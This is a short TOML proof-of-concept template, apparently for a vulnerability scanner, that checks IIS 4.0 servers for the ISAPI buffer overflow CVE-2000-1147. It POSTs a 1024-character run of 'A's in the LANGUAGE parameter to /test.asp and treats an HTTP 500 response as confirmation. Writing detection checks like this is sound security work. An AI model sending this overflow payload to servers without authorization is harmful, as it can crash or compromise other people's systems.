[info]
author = "ave"
description = "通过在 ASP 脚本标签的 LANGUAGE 参数中发送超长字符串来验证 IIS 4.0 ISAPI 的缓冲区溢出漏洞"
id = "POC-AVE-2000-0824"
name = "Microsoft IIS 4.0 ISAPI Buffer Overflow PoC"
severity = "medium"
tags = ["cve-2000-1147"]
vuln_id = [
    "CVE-2000-1147",
    "AVE-2000-0824",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/test.asp"
protocol = "http"

[poc.requests.body]
content = "LANGUAGE={{repeat('A', 1024)}}"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
